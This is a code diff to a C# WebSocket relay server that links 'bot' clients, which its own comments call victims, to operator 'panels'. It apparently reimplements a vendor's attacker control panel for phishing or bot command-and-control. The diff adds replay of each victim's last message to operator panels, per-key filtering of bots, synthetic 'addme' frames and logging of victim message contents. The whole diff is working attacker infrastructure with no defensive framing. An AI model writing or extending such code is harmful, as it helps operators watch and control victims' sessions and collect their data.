@@ -18,6 +18,7 @@
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using Microsoft.Extensions.Logging;
+using Microsoft.Extensions.Logging.Abstractions;
 using System.Net.WebSockets;
 using System.Text;
 
@@ -39,17 +40,23 @@ public class RelayHub
         public string Ip;
         public WebSocket Socket;
         public DateTime ConnectedAt = DateTime.UtcNow;
+        // Last frame the bot sent. Replayed to a panel that joins *after* the
+        // victim connected, so the grid repopulates on reconnect.
+        public string LastMessage;
     }
 
     private readonly ConcurrentDictionary<string, PanelClient> _panels = new();
     private readonly ConcurrentDictionary<string, BotClient> _bots = new();
-    private readonly ILogger<RelayHub> _log;
+    private readonly ILogger _log;
     private readonly ServerConfig _config;
 
-    public RelayHub(ILogger<RelayHub> log, ServerConfig config)
+    // NOTE: the parameter must be ILogger<RelayHub> (not ILogger), because the
+    // container registers the generic ILogger<T> — passing the non-generic type
+    // silently resolves to NullLogger and the hub logs nothing at all.
+    public RelayHub(ServerConfig config, ILogger<RelayHub> log = null)
     {
-        _log = log;
         _config = config;
+        _log = log ?? NullLogger<RelayHub>.Instance;
     }
 
     public int PanelCount => _panels.Count;
@@ -59,6 +66,7 @@ public class RelayHub
     /// <summary>Accept and run one WebSocket connection until it closes.</summary>
     public async Task RunConnectionAsync(WebSocket socket, string remoteIp)
     {
+        _log.LogInformation("relay: connection opened from {Ip}", remoteIp);
         var buffer = new byte[1 << 20];
         try
         {
@@ -81,6 +89,9 @@ public class RelayHub
                 if (ms.Length == 0) continue;
 
                 string message = Encoding.UTF8.GetString(ms.ToArray());
+                _log.LogInformation("relay: <- {Ip} {Len}b {Snippet}",
+                    remoteIp, ms.Length,
+                    message.Length > 160 ? message.Substring(0, 160) : message);
                 if (!HandleMessage(message, socket, remoteIp))
                     return; // fatal protocol error — drop the connection
             }
@@ -116,13 +127,19 @@ public class RelayHub
                 case "join":
                 {
                     var panel = new PanelClient { Idf = idf, Socket = socket, ConKey = cokey };
-                    if (_panels.TryRemove(idf, out PanelClient old))
+                    if (_panels.TryRemove(idf, out PanelClient old) && old.Socket != null)
                         TrySend(old.Socket, "{\"itype\":\"slr_panel\",\"subc\":\"kicked\"}");
                     _panels[idf] = panel;
-                    _log.LogInformation("panel joined: {Idf} from {Ip}", idf, remoteIp);
-                    // Send the bot list so a reconnecting panel repopulates its grid
+                    _log.LogInformation("panel joined: {Idf} from {Ip} (cokey={CoKey})", idf, remoteIp, cokey);
+                    // Replay the last frame of every bot this panel is allowed to
+                    // see, so a reconnecting panel (or a freshly focused one)
+                    // repopulates its grid. The panel only understands *bot
+                    // frames* (type=msg), not a synthetic "botintro" shape.
                     foreach (BotClient bot in _bots.Values)
-                        TrySend(socket, BotIntro(bot));
+                    {
+                        if (!PanelCanSee(panel, bot.CoKey)) continue;
+                        TrySend(socket, string.IsNullOrEmpty(bot.LastMessage) ? BotIntro(bot) : bot.LastMessage);
+                    }
                     return true;
                 }
                 case "out":
@@ -162,6 +179,7 @@ public class RelayHub
                 return new BotClient { Pid = pid, CoKey = cokey, Ip = remoteIp, Socket = socket };
             });
             bot.Socket = socket;
+            bot.LastMessage = message;
             if (bot.Ip != remoteIp) { bot.Ip = remoteIp; isNew = true; }
             if (bot.CoKey != cokey) { bot.CoKey = cokey; isNew = true; }
 
@@ -177,15 +195,22 @@ public class RelayHub
         return true;
     }
 
-    /// <summary>Send a synthetic bot introduction (used on panel join).</summary>
+    /// <summary>
+    /// A panel sees every bot when it joined without a connection key,
+    /// otherwise only bots whose payload carried the same key.
+    /// </summary>
+    private static bool PanelCanSee(PanelClient panel, string cokey)
+        => string.IsNullOrEmpty(panel.ConKey) || panel.ConKey == cokey;
+
+    /// <summary>Send a synthetic bot introduction (only used before a bot has spoken).</summary>
     private static string BotIntro(BotClient bot)
         => System.Text.Json.JsonSerializer.Serialize(new Dictionary<string, object>
         {
-            ["itype"] = "slr_panel",
-            ["subc"] = "botintro",
+            ["cip"] = bot.Ip,
+            ["type"] = "msg",
             ["pid"] = bot.Pid,
             ["cokey"] = bot.CoKey ?? "",
-            ["ip"] = bot.Ip,
+            ["data"] = "{\"type\":\"addme\"}",
         });
 
     private void BroadcastToPanels(string message, string cokey)
@@ -194,7 +219,7 @@ public class RelayHub
         {
             // Only panels bound to the same connection key see this bot's traffic;
             // unbound panels (no cokey on join) see everything, like the vendor.
-            if (string.IsNullOrEmpty(panel.ConKey) || panel.ConKey == cokey)
+            if (PanelCanSee(panel, cokey))
                 TrySend(panel.Socket, message);
         }
     }
